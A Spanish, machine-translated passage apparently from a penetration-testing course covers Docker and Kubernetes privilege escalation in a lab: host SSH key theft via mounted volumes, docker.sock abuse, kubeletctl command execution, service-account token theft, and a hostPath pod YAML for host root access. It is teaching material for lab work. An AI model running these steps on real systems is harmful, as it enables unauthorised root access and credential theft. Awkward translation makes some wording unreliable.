Además, Docker Daemon ofrece capacidades de monitoreo y registro, por ejemplo:

- Captura registros de contenedores
    
- Proporciona información sobre las actividades del contenedor, los errores y la información de depuración.
    

El Daemon también monitorea la utilización de recursos, como la CPU, la memoria y el uso de la red, lo que nos permite optimizar el rendimiento del contenedor y solucionar problemas.

#### Red y Almacenamiento

Facilita la creación de redes de contenedores mediante la creación de redes virtuales y la gestión de interfaces de red. Permite a los contenedores comunicarse entre sí y con el mundo exterior a través de puertos de red, direcciones IP y resolución de DNS. El Daemon Docker también desempeña un papel fundamental en la gestión del almacenamiento, ya que maneja los volúmenes Docker, que se utilizan para persistir los datos más allá de la vida útil de los contenedores y gestiona la creación de volumen, el archivo adjunto y la limpieza, lo que permite a los contenedores compartir o almacenar datos de forma independiente entre sí.

#### Clientes Docker

Cuando interactuamos con Docker, emitimos comandos a través del `Docker Client`, que se comunica con el Daemon Docker (a través de un `RESTful API` o a `Unix socket`) y sirve como nuestro principal medio de interactuar con Docker. También tenemos la capacidad de crear, iniciar, detener, administrar, eliminar contenedores, buscar y descargar imágenes de Docker. Con estas opciones, podemos extraer imágenes existentes para usarlas como base para nuestros contenedores o crear nuestras imágenes personalizadas utilizando Dockerfiles. Tenemos la flexibilidad de llevar nuestras imágenes a repositorios remotos, facilitando la colaboración y el intercambio dentro de nuestros equipos o con la comunidad en general.

En comparación, el Daemon, por otro lado, lleva a cabo las acciones solicitadas, asegurando que los contenedores se creen, lancen, detengan y eliminen según sea necesario.

Otro cliente para Docker es `Docker Compose`. Es una herramienta que simplifica la orquestación de múltiples contenedores Docker como una sola aplicación. Nos permite definir la arquitectura de contenedores múltiples de nuestra aplicación utilizando un declarativo `YAML` (`.yaml`/`.yml`) archivo. Con él, podemos especificar los servicios que comprenden nuestra aplicación, sus dependencias y sus configuraciones. Definimos imágenes de contenedores, variables de entorno, redes, enlaces de volumen y otras configuraciones. Docker Compose asegura que todos los contenedores definidos se lancen e interconecten, creando una pila de aplicaciones cohesiva y escalable.

#### Escritorio Docker

`Docker Desktop`está disponible para sistemas operativos MacOS, Windows y Linux y nos proporciona una GUI fácil de usar que simplifica la administración de contenedores y sus componentes. Esto nos permite monitorear el estado de nuestros contenedores, inspeccionar registros y administrar los recursos asignados a Docker. Proporciona una forma intuitiva y visual de interactuar con el ecosistema Docker, haciéndolo accesible para desarrolladores de todos los niveles de experiencia y, además, es compatible con Kubernetes.

---

## Docker Imágenes y Contenedores

Piensa en un `Docker image` como un plano o una plantilla para crear contenedores. Encapsula todo lo necesario para ejecutar una aplicación, incluido el código, las dependencias, las bibliotecas y las configuraciones de la aplicación. Una imagen es un paquete autónomo de solo lectura que garantiza la consistencia y la reproducibilidad en diferentes entornos. Podemos crear imágenes usando un archivo de texto llamado a `Dockerfile`, que define los pasos e instrucciones para construir la imagen.

A `Docker container` es una instancia de una imagen Docker. Es un entorno ligero, aislado y ejecutable que ejecuta aplicaciones. Cuando lanzamos un contenedor, se crea a partir de una imagen específica, y el contenedor hereda todas las propiedades y configuraciones definidas en esa imagen. Cada contenedor funciona de forma independiente, con su propio sistema de archivos, procesos e interfaces de red. Este aislamiento garantiza que las aplicaciones dentro de los contenedores permanezcan separadas del sistema host subyacente y otros contenedores, evitando conflictos e interferencias.

Mientras `images` son inmutables y `read-only`, `containers` son mutables y `can be modified` durante el tiempo de ejecución. Podemos interactuar con contenedores, ejecutar comandos dentro de ellos, monitorear sus registros e incluso realizar cambios en su sistema de archivos o entorno. Sin embargo, las modificaciones realizadas en el sistema de archivos de un contenedor no persisten a menos que se guarden explícitamente como una nueva imagen o se almacenen en un volumen persistente.

---

## Escalada de Privilegio Docker

Lo que puede pasar es que tengamos acceso a un entorno donde encontraremos usuarios que puedan gestionar contenedores docker. Con esto, podríamos buscar formas de usar esos contenedores docker para obtener mayores privilegios en el sistema de destino. Podemos usar varias formas y técnicas para escalar nuestros privilegios o escapar del contenedor docker.

#### Directorios Compartidos de Docker

Cuando se utiliza Docker, los directorios compartidos (montajes de volumen) pueden cerrar la brecha entre el sistema host y el sistema de archivos del contenedor. Con directorios compartidos, directorios o archivos específicos en el sistema host pueden ser accesibles dentro del contenedor. Esto es increíblemente útil para datos persistentes, compartir código y facilitar la colaboración entre entornos de desarrollo y contenedores Docker. Sin embargo, siempre depende de la configuración del entorno y de los objetivos que los administradores quieren lograr. Para crear un directorio compartido, se especifica una ruta en el sistema host y una ruta correspondiente dentro del contenedor, creando un enlace directo entre las dos ubicaciones.

Los directorios compartidos ofrecen varias ventajas, incluida la capacidad de persistir los datos más allá de la vida útil de un contenedor, simplificar el intercambio y desarrollo de código y permitir la colaboración dentro de los equipos. Es importante tener en cuenta que los directorios compartidos se pueden montar como de solo lectura o lectura-escritura, dependiendo de los requisitos específicos del administrador. Cuando se monta como de solo lectura, las modificaciones realizadas dentro del contenedor no afectarán al sistema host, lo cual es útil cuando se prefiere el acceso de solo lectura para evitar modificaciones accidentales.

Cuando tengamos acceso al contenedor docker y lo enumeremos localmente, podríamos encontrar directorios adicionales (no estándar) en el sistema de archivos dockerrays.

  Acoplador

```shell-session
root@container:~$ cd /hostsystem/home/cry0l1t3
root@container:/hostsystem/home/cry0l1t3$ ls -l

-rw-------  1 cry0l1t3 cry0l1t3  12559 Jun 30 15:09 .bash_history
-rw-r--r--  1 cry0l1t3 cry0l1t3    220 Jun 30 15:09 .bash_logout
-rw-r--r--  1 cry0l1t3 cry0l1t3   3771 Jun 30 15:09 .bashrc
drwxr-x--- 10 cry0l1t3 cry0l1t3   4096 Jun 30 15:09 .ssh


root@container:/hostsystem/home/cry0l1t3$ cat .ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de aquí, podríamos copiar el contenido de la clave SSH privada para `cry0l1t3.priv` archiva y úsalo para iniciar sesión como usuario `cry0l1t3` en el sistema host.

  Acoplador

```shell-session
vcrdcr@htb[/htb]$ ssh cry0l1t3@<host IP> -i cry0l1t3.priv
```

#### Bolsillos Docker

Un socket Docker o socket Docker daemon es un archivo especial que nos permite y procesa comunicarnos con el daemon Docker. Esta comunicación se produce a través de un socket Unix o un socket de red, dependiendo de la configuración de nuestra configuración Docker. Actúa como un puente, facilitando la comunicación entre el cliente Docker y el demonio Docker. Cuando emitimos un comando a través de Docker CLI, el cliente Docker envía el comando al socket Docker, y el demonio Docker, a su vez, procesa el comando y lleva a cabo las acciones solicitadas.

Sin embargo, los sockets Docker requieren permisos apropiados para garantizar una comunicación segura y evitar el acceso no autorizado. El acceso al socket Docker generalmente está restringido a usuarios o grupos de usuarios específicos, lo que garantiza que solo las personas de confianza puedan emitir comandos e interactuar con el demonio Docker. Al exponer el socket Docker a través de una interfaz de red, podemos administrar de forma remota los hosts Docker, emitir comandos y controlar contenedores y otros recursos. Este acceso remoto a la API amplía las posibilidades de configuraciones distribuidas de Docker y escenarios de administración remota. Sin embargo, dependiendo de la configuración, hay muchas formas en que se pueden almacenar procesos o tareas automatizados. Esos archivos pueden contener información muy útil para nosotros que podemos usar para escapar del contenedor Docker.

  Acoplador

```shell-session
htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x 1 htb-student htb-student 4096 Jun 30 15:12 .
drwxr-xr-x 1 root        root        4096 Jun 30 15:12 ..
srw-rw---- 1 root        root           0 Jun 30 15:27 docker.sock
```

A partir de ahora, podemos usar el `docker` binario para interactuar con el socket y enumerar qué contenedores docker ya se están ejecutando. Si no está instalado, podemos descargarlo [aquí](https://master.dockerproject.org/linux/x86_64/docker) y cárgalo en el contenedor Docker.

  Acoplador

```shell-session
htb-student@container:/tmp$ wget https://<parrot-os>:443/docker -O docker
htb-student@container:/tmp$ chmod +x docker
htb-student@container:/tmp$ ls -l

-rwxr-xr-x 1 htb-student htb-student 0 Jun 30 15:27 docker


htb-student@container:~/tmp$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
<SNIP>
```

Podemos crear nuestro propio contenedor Docker que mapea el directorio raíz de hosts (`/`) a la `/hostsystem` directorio en el contenedor. Con esto, obtendremos acceso completo al sistema host. Por lo tanto, debemos mapear estos directorios en consecuencia y usar el `main_app` Imagen docker.

  Acoplador

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
htb-student@container:~/app$ /tmp/docker -H unix:///app/docker.sock ps

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
7ae3bcc818af     main_app      "/docker-entry.s..."    12 seconds ago    Up 8 seconds     443/tcp   app
3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago        Up 17 minutes    443/tcp   app
<SNIP>
```

Ahora, podemos iniciar sesión en el nuevo contenedor Docker privilegiado con el ID `7ae3bcc818af` y navegar hasta el `/hostsystem`.

  Acoplador

```shell-session
htb-student@container:/app$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash


root@7ae3bcc818af:~# cat /hostsystem/root/.ssh/id_rsa

-----BEGIN RSA PRIVATE KEY-----
<SNIP>
```

A partir de ahí, podemos intentar nuevamente tomar la clave SSH privada e iniciar sesión como root o como cualquier otro usuario en el sistema con una clave SSH privada en su carpeta.

#### Grupo Docker

Para obtener privilegios de root a través de Docker, el usuario con el que hemos iniciado sesión debe estar en el `docker` grupo. Esto le permite usar y controlar el demonio Docker.

  Acoplador

```shell-session
docker-user@nix02:~$ id

uid=1000(docker-user) gid=1000(docker-user) groups=1000(docker-user),116(docker)
```

Alternativamente, Docker puede tener un conjunto SUID, o estamos en el archivo Sudoers, lo que nos permite ejecutar `docker` como raíz. Las tres opciones nos permiten trabajar con Docker para escalar nuestros privilegios.

La mayoría de los hosts tienen una conexión directa a Internet porque las imágenes base y los contenedores deben descargarse. Sin embargo, muchos hosts pueden desconectarse de Internet por la noche y fuera del horario laboral por razones de seguridad. Sin embargo, si estos hosts se encuentran en una red donde, por ejemplo, un servidor web tiene que pasar, todavía se puede llegar.

Para ver qué imágenes existen y a qué podemos acceder, podemos usar el siguiente comando:

  Acoplador

```shell-session
docker-user@nix02:~$ docker image ls

REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
```

#### Socket Docker

Un caso que también puede ocurrir es cuando el socket Docker es escribible. Por lo general, este enchufe se encuentra en `/var/run/docker.sock`. Sin embargo, la ubicación puede ser comprensiblemente diferente. Porque básicamente, esto solo puede ser escrito por el grupo root o docker. Si actuamos como usuario, no en uno de estos dos grupos, y el socket Docker todavía tiene los privilegios para ser escribible, entonces todavía podemos usar este caso para escalar nuestros privilegios.

  Acoplador

```shell-session
docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~# ls -l

total 68
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   4 root root  4096 Sep 22 11:34 boot
drwxr-xr-x   2 root root  4096 Oct  6  2021 cdrom
drwxr-xr-x  19 root root  3940 Oct 24 13:28 dev
drwxr-xr-x 100 root root  4096 Sep 22 13:27 etc
drwxr-xr-x   3 root root  4096 Sep 22 11:06 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 Oct  6  2021 lost+found
drwxr-xr-x   2 root root  4096 Oct 24 13:28 media
drwxr-xr-x   2 root root  4096 Apr 23  2020 mnt
drwxr-xr-x   2 root root  4096 Apr 23  2020 opt
dr-xr-xr-x 307 root root     0 Oct 24 13:28 proc
drwx------   6 root root  4096 Sep 26 21:11 root
drwxr-xr-x  28 root root   920 Oct 24 13:32 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   7 root root  4096 Oct  7  2021 snap
drwxr-xr-x   2 root root  4096 Apr 23  2020 srv
dr-xr-xr-x  13 root root     0 Oct 24 13:28 sys
drwxrwxrwt  13 root root  4096 Oct 24 13:44 tmp
drwxr-xr-x  14 root root  4096 Sep 22 11:11 usr
drwxr-xr-x  13 root root  4096 Apr 23  2020 var
```


# Kubernetes

---

[Kubernetes](https://kubernetes.io/), también conocido como `K8s`se destaca como una tecnología revolucionaria que ha tenido un impacto significativo en el panorama del desarrollo de software. Esta plataforma ha transformado completamente el proceso de implementación y administración de aplicaciones, proporcionando un enfoque más eficiente y simplificado. Al ofrecer una arquitectura de código abierto, Kubernetes ha sido diseñado específicamente para facilitar una implementación, escalado y administración más rápida y directa de los contenedores de aplicaciones.

Desarrollado por Google, Kubernetes aprovecha más de una década de experiencia en la ejecución de cargas de trabajo complejas. Como resultado, se ha convertido en una herramienta crítica en el universo DevOps para la orquestación de microservicios. Desde su creación, Kubernetes ha sido donado a la [Fundación Cloud Native Computing](https://www.cncf.io/), donde se ha convertido en el estándar de oro de la industria. Comprender los aspectos de seguridad de los contenedores K8 es crucial. Probablemente podremos acceder a uno de los muchos contenedores durante nuestra prueba de penetración.

Una de las características clave de Kubernetes es su adaptabilidad y compatibilidad con diversos entornos. Esta plataforma ofrece una amplia gama de características que permiten a los desarrolladores y administradores de sistemas configurar, automatizar y escalar fácilmente sus implementaciones y aplicaciones. Como resultado, Kubernetes se ha convertido en una solución de referencia para las organizaciones que buscan racionalizar sus procesos de desarrollo y mejorar la eficiencia.

Kubernetes es un sistema de orquestación de contenedores, que funciona ejecutando todas las aplicaciones en contenedores aislados del sistema host `multiple layers of protection`. Este enfoque garantiza que las aplicaciones no se vean afectadas por cambios en el sistema host, como actualizaciones o parches de seguridad. La arquitectura K8s comprende un `master node` y `worker nodes`, cada uno con roles específicos.

---

## Concepto K8s

Kubernetes gira en torno al concepto de vainas, que pueden contener uno o más contenedores estrechamente conectados. Cada pod funciona como una máquina virtual separada en un nodo, completa con su propia IP, nombre de host y otros detalles. Kubernetes simplifica la administración de múltiples contenedores al ofrecer herramientas para el equilibrio de carga, el descubrimiento de servicios, la orquestación de almacenamiento, la autocuración y más. A pesar de los desafíos en seguridad y administración, K8s continúa creciendo y mejorando con características como `Role-Based Access Control` (`RBAC`), `Network Policies`, y `Security Contexts`, proporcionando un entorno más seguro para las aplicaciones.

Diferencias entre K8 y Docker

|**Función**|**Acoplador**|**Kubernetes**|
|---|---|---|
|`Primary`|Plataforma para contenerización de aplicaciones|Una herramienta de orquestación para gestionar contenedores|
|`Scaling`|Escalado manual con enjambre Docker|Escalado automático|
|`Networking`|Red única|Red compleja con políticas|
|`Storage`|Volúmenes|Amplia gama de opciones de almacenamiento|

La arquitectura de Kubernetes se divide principalmente en dos tipos de componentes:

- `The Control Plane`(nodo maestro), que es responsable de controlar el clúster de Kubernetes
    
- `The Worker Nodes`(miniones), donde se ejecutan las aplicaciones en contenedores
    

#### Nodos

El nodo maestro aloja los Kubernetes `Control Plane`, que gestiona y coordina todas las actividades dentro del clúster y también garantiza que se mantenga el estado deseado del clúster. Por otro lado, el `Minions` ejecute las aplicaciones reales y recibirán instrucciones del Plano de control y garantizarán que se logre el estado deseado.

Cubre la versatilidad para satisfacer diversas necesidades, como bases de datos de soporte, cargas de trabajo AI/ML y microservicios nativos de la nube. Además, es capaz de administrar aplicaciones de altos recursos en el borde y es compatible con diferentes plataformas. Por lo tanto, se puede utilizar en servicios de nube pública como Google Cloud, Azure y AWS o dentro de centros de datos locales privados.

#### Plano de Control

El Plano de Control sirve como la capa de gestión. Consiste en varios componentes cruciales, incluyendo:

|**Servicio**|**Puertos TCP**|
|---|---|
|`etcd`|`2379`, `2380`|
|`API server`|`6443`|
|`Scheduler`|`10251`|
|`Controller Manager`|`10252`|
|`Kubelet API`|`10250`|
|`Read-Only Kubelet API`|`10255`|

Estos elementos permiten el `Control Plane` para tomar decisiones y proporcionar una visión completa de todo el clúster.

#### Miniones

Dentro de un entorno en contenedores, el `Minions` (nodos de trabajo) sirven como la ubicación designada para ejecutar aplicaciones. Es importante tener en cuenta que cada nodo está administrado y regulado por el Plano de control, lo que ayuda a garantizar que todos los procesos que se ejecutan dentro de los contenedores funcionen sin problemas y de manera eficiente.

El `Scheduler`, basado en el `API server`, entiende el estado del clúster y programa nuevas cápsulas en los nodos en consecuencia. Después de decidir en qué nodo debe ejecutarse un pod, el servidor API actualiza el `etcd`.

Comprender cómo interactúan estos componentes es esencial para comprender el funcionamiento de Kubernetes. El servidor API es el punto de entrada para todos los comandos administrativos, ya sea de los usuarios a través de kubectl o de los controladores. Este servidor se comunica con etcd para buscar o actualizar el estado del clúster.

#### Medidas de seguridad de K8

La seguridad de Kubernetes se puede dividir en varios dominios:

- Seguridad de la infraestructura del clúster
- Seguridad de configuración del clúster
- Seguridad de aplicaciones
- Seguridad de datos

Cada dominio incluye múltiples capas y elementos que deben ser asegurados y administrados adecuadamente por los desarrolladores y administradores.

---

## API Kubernetes

El núcleo de la arquitectura de Kubernetes es su API, que sirve como el principal punto de contacto para todas las interacciones internas y externas. La API de Kubernetes ha sido diseñada para soportar el control declarativo, permitiendo a los usuarios definir su estado deseado para el sistema. Esto permite a Kubernetes tomar las medidas necesarias para implementar el estado deseado. El kube-apiserver es responsable de alojar la API, que maneja y verifica las solicitudes RESTful para modificar el estado del sistema. Estas solicitudes pueden implicar la creación, modificación, eliminación y recuperación de información relacionada con diversos recursos dentro del sistema. En general, la API de Kubernetes desempeña un papel crucial para facilitar la comunicación y el control sin interrupciones dentro del clúster de Kubernetes.

Dentro del marco de Kubernetes, un recurso API sirve como punto final que alberga una colección específica de objetos API. Estos objetos pertenecen a una categoría particular e incluyen elementos esenciales como Pods, Servicios y Implementaciones, entre otros. Cada recurso único viene equipado con un conjunto distinto de operaciones que se pueden ejecutar, incluyendo pero no limitado a:

|**Solicitud**|**Descripción**|
|---|---|
|`GET`|Recupera información sobre un recurso o una lista de recursos.|
|`POST`|Crea un nuevo recurso.|
|`PUT`|Actualiza un recurso existente.|
|`PATCH`|Aplica actualizaciones parciales a un recurso.|
|`DELETE`|Elimina un recurso.|

#### Autenticación

En términos de autenticación, Kubernetes admite varios métodos, como certificados de cliente, tokens de portador, un proxy de autenticación o autenticación básica HTTP, que sirven para verificar la identidad del usuario. Una vez que el usuario ha sido autenticado, Kubernetes hace cumplir las decisiones de autorización utilizando el Control de Acceso Basado en Rol (`RBAC`). Esta técnica implica asignar roles específicos a los usuarios o procesos con los permisos correspondientes para acceder y operar sobre los recursos. Por lo tanto, el proceso de autenticación y autorización de Kubernetes es una medida de seguridad integral que garantiza que solo los usuarios autorizados puedan acceder a los recursos y realizar operaciones.

En Kubernetes, el `Kubelet` se puede configurar para permitir `anonymous access`. De forma predeterminada, el Kubelet permite el acceso anónimo. Las solicitudes anónimas se consideran no autenticadas, lo que implica que cualquier solicitud realizada al Kubelet sin un certificado de cliente válido será tratada como anónima. Esto puede ser problemático ya que cualquier proceso o usuario que pueda llegar a la API de Kubelet puede realizar solicitudes y recibir respuestas, exponiendo potencialmente información confidencial o llevando a acciones no autorizadas.

#### Interacción del servidor API de K8

  Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:6443 -k

{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` por lo general, representa a un usuario no autenticado, lo que significa que no hemos proporcionado credenciales válidas o estamos tratando de acceder al servidor API de forma anónima. En este caso, intentamos acceder a la ruta raíz, lo que otorgaría un control significativo sobre el clúster de Kubernetes si tiene éxito. De forma predeterminada, el acceso a la ruta raíz generalmente está restringido a usuarios autenticados y autorizados con privilegios administrativos y el servidor API denegó la solicitud, respondiendo con un `403 Forbidden` código de estado en consecuencia.

#### API Kubelet - Extracción de pods

  Kubernetes

```shell-session
cry0l1t3@k8:~$ curl https://10.129.10.11:10250/pods -k | jq .

...SNIP...
{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
              "f:spec": {
                "f:containers": {
                  "k:{\"name\":\"nginx\"}": {
                    ".": {},
                    "f:image": {},
                    "f:imagePullPolicy": {},
                    "f:name": {},
                    "f:ports": {
					...SNIP...
```

La información mostrada en la salida incluye el `names`, `namespaces`, `creation timestamps`, y `container images` de las vainas. También muestra el `last applied configuration` para cada pod, que podría contener detalles confidenciales sobre las imágenes del contenedor y sus políticas de extracción.

Comprender las imágenes del contenedor y sus versiones utilizadas en el clúster puede permitirnos identificar vulnerabilidades conocidas y explotarlas para obtener acceso no autorizado al sistema. La información del espacio de nombres puede proporcionar información sobre cómo se organizan las cápsulas y los recursos dentro del clúster, que podemos usar para apuntar a espacios de nombres específicos con vulnerabilidades conocidas. También podemos usar metadatos como `uid` y `resourceVersion` realizar reconocimiento y reconocer objetivos potenciales para nuevos ataques. La divulgación de la última configuración aplicada puede exponer información confidencial, como contraseñas, secretos o tokens API, utilizados durante la implementación de los pods.

Podemos analizar más a fondo los pods con el siguiente comando:

#### Kubeletctl - Extracción de Pods

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 pods

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ coredns-78fcd69978-zbwf9           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
```

Para interactuar eficazmente con las cápsulas dentro del entorno de Kubernetes, es importante tener una comprensión clara de los comandos disponibles. Un enfoque que puede ser particularmente útil es utilizar el `scan rce` comandar en `kubeletctl`. Este comando proporciona información valiosa y permite una gestión eficiente de las cápsulas.

#### API de Kubelet - Comandos disponibles

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.10.11 │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
```

También es posible para nosotros interactuar con un contenedor de forma interactiva y obtener información sobre el alcance de nuestros privilegios dentro de él. Esto nos permite comprender mejor nuestro nivel de acceso y control sobre el contenido del contenedor.

#### Kubelet API - Ejecución de comandos

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

La salida del comando muestra que el usuario actual ejecuta el `id` el comando dentro del contenedor tiene privilegios de root. Esto indica que hemos obtenido acceso administrativo dentro del contenedor, lo que podría conducir a vulnerabilidades de escalada de privilegios. Si obtenemos acceso a un contenedor con privilegios de root, podemos realizar más acciones en el sistema host u otros contenedores.

---

## Escalada Privilegio

Para obtener mayores privilegios y acceder al sistema host, podemos utilizar una herramienta llamada [kubeletctl](https://github.com/cyberark/kubeletctl) para obtener la cuenta de servicio de Kubernetes `token` y `certificate` (`ca.crt`) desde el servidor. Para hacer esto, debemos proporcionar la dirección IP, el espacio de nombres y el pod de destino del servidor. En caso de que obtengamos este token y certificado, podemos elevar aún más nuestros privilegios, movernos horizontalmente a través del clúster u obtener acceso a módulos y recursos adicionales.

#### Kubelet API - Extracción de Tokens

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

#### Kubelet API - Extracción de certificados

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
<SNIP>
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----END CERTIFICATE-----
```

Ahora que tenemos ambos `token` y `certificate`, podemos comprobar los derechos de acceso en el clúster de Kubernetes. Esto se usa comúnmente para la auditoría y verificación para garantizar que los usuarios tengan el nivel correcto de acceso y no se les otorguen más privilegios de los que necesitan. Sin embargo, podemos usarlo para nuestros propósitos y podemos preguntar a K8 si tenemos permiso para realizar diferentes acciones en varios recursos.

#### Lista Privilegios

  Kubernetes

```shell-session
cry0l1t3@k8:~$ export token=`cat k8.token`
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											[]					[]				[get create list]
...SNIP...
```

Aquí podemos ver algunas informaciones muy importantes. Además de los recursos de auto-sujeto que podemos `get`, `create`, y `list` pods que son los recursos que representan el contenedor en ejecución en el clúster. A partir de ahora, podemos crear un `YAML` archivo que podemos usar para crear un nuevo contenedor y montar todo el sistema de archivos raíz desde el sistema host en este contenedor `/root` directorio. A partir de ahí, podríamos acceder a los archivos y directorios de los sistemas host. El `YAML` el archivo podría parecer lo siguiente:

#### YAML Pod

Código: ñame

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```

Una vez creado, ahora podemos crear el nuevo pod y verificar si se está ejecutando como se esperaba.

#### Creando un nuevo Pod

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


cry0l1t3@k8:~$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Si el pod se está ejecutando, podemos ejecutar el comando y podríamos generar un shell inverso o recuperar datos confidenciales como la clave SSH privada del usuario raíz.

#### Extracción de la llave SSH de Root

  Kubernetes

```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
...SNIP...
```


# Logrotate

Cada sistema Linux produce grandes cantidades de archivos de registro. Para evitar que el disco duro se desborde, una herramienta llamada `logrotate` se encarga de archivar o eliminar registros antiguos. Si no se presta atención a los archivos de registro, se vuelven cada vez más grandes y eventualmente ocupan todo el espacio en disco disponible. Además, buscar a través de muchos archivos de registro grandes lleva mucho tiempo. Para evitar esto y ahorrar espacio en disco, `logrotate` ha sido desarrollado. Los registros en `/var/log` brinde a los administradores la información que necesitan para determinar la causa detrás del mal funcionamiento. Casi más importantes son los detalles inadvertidos del sistema, como si todos los servicios se ejecutan correctamente.

`Logrotate`tiene muchas características para administrar estos archivos de registro. Estos incluyen la especificación de:

- el `size` del archivo de registro,
- su `age`,
- y el `action` debe tomarse cuando se alcanza uno de estos factores.

  Logrotar

```shell-session
